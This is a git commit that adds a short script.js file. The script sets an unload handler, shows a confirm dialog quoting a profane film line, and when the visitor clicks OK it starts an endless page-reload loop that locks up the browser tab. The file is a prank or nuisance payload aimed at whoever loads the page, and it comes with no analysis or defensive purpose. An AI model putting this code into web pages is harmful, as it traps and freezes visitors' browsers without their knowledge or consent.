8115bd7bb06f8fc007f294b8501aab72a5122095
f o o k d <56459644+G502045@users.noreply.github.com>
2022-04-20 08:50:44 -0400

    Create script.js

---
+++ script.js
@@ -0,0 +1,7 @@
+onbeforeunload = function(){localStorage.x=1};
+
+if(confirm("Normally, Both your asses would be dead as fucking fried chicken, but you happen to pull this shit while I'm in a transitional period so I don't wanna kill you, I wanna help you. But I can't give you this case, it don't belong to me. Besides, I've already been through too much shit this morning over this case to hand it over to your dumb ass.")){
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
+}
